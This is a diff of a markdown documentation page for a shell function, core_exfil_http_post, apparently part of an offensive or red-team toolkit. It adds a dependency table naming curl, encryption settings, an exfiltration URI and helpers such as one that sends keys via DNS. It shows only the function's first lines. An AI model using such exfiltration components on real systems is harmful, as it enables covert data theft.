@@ -1,15 +1,29 @@
 # Exfil Http Post
 
-## Purpose
-
+### Purpose
 core_exfil_http_post function implementation from base.sh.
 
-## Implementation
+### Dependencies
+| Type | Name | Value |
+|------|------|-------|
+| Global Variable | `CMD_CURL` | "curl" |
+| Global Variable | `ENCODING_TYPE` | "none" |
+| Global Variable | `ENCRYPT` | "none" |
+| Global Variable | `ENCRYPTION_TYPE` | "none" |
+| Global Variable | `ENCRYPT_KEY` | "" |
+| Global Variable | `EXFIL_URI` | "" |
+| Global Variable | `JOB_ID` | "" |
+| Function | `core_exfil_http_post()` | For exfil http post |
+| Function | `core_extract_domain()` | For extract domain |
+| Function | `core_generate_json_payload()` | For generate json payload |
+| Function | `core_normalize_uri()` | For normalize uri |
+| Function | `core_prepare_exfil_data()` | For prepare exfil data |
+| Function | `core_send_key_via_dns()` | For send key via dns |
+| Function | `core_url_safe_encode()` | For url safe encode |
 
 <details>
-<summary>Function Code</summary>
 
-```bash
+```shell
 core_exfil_http_post() {
 local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -52,12 +66,4 @@ local data="$1"
 }
 ```
 
-</details>
-
-## Usage
-
-Document usage examples and parameters here.
-
-## Notes
-
-Add any implementation notes or considerations.
+</details> 
